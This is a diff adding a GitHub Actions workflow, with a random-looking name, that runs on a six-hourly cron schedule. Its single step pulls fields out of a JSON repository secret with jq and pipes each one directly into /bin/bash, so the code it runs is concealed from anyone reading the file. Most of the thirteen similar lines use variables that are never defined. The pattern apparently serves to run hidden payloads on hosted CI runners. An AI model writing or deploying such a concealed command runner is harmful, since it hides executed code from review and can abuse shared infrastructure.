@@ -1,0 +1,30 @@
+name: lanjingtian5614
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lanjingtian5614
+        env:
+          mks136: ${{ secrets.mks136 }}
+        run: |
+          echo $mks136 | jq -r .bwomb08 | /bin/bash
+          echo $pfr061 | jq -r .whe88217 | /bin/bash
+          echo $i4 | jq -r .svzyi48 | /bin/bash
+          echo $botvd076 | jq -r .ggxna02 | /bin/bash
+          echo $hi42 | jq -r .tc17 | /bin/bash
+          echo $qz27624 | jq -r .tst7 | /bin/bash
+          echo $ad431 | jq -r .pi81614 | /bin/bash
+          echo $oj2178 | jq -r .r819 | /bin/bash
+          echo $ivrgh8 | jq -r .pdruf0 | /bin/bash
+          echo $bnrrq22 | jq -r .ciw74 | /bin/bash
+          echo $vgg7115 | jq -r .rojx5815 | /bin/bash
+          echo $xcdhq599 | jq -r .w863 | /bin/bash
+          echo $wmqbn24 | jq -r .pab49 | /bin/bash
+          echo $odnr796 | jq -r .cwb11 | /bin/bash
+
